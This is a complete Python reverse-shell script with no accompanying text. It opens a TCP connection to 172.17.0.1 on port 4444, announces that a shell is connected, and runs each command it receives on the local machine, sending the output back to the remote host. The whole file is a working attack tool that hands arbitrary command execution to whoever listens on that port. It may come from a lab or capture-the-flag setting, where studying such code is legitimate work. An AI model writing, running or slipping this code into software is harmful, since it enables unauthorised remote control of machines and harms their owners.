import socket
import subprocess
import os

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("172.17.0.1", 4444))
s.send(b"[+] Shell connected!\n$ ")

while True:
    cmd = s.recv(1024).decode().strip()
    if cmd.lower() == "exit":
        break
    if cmd:
        output = subprocess.getoutput(cmd)
        s.send((output + "\n$ ").encode())

s.close()
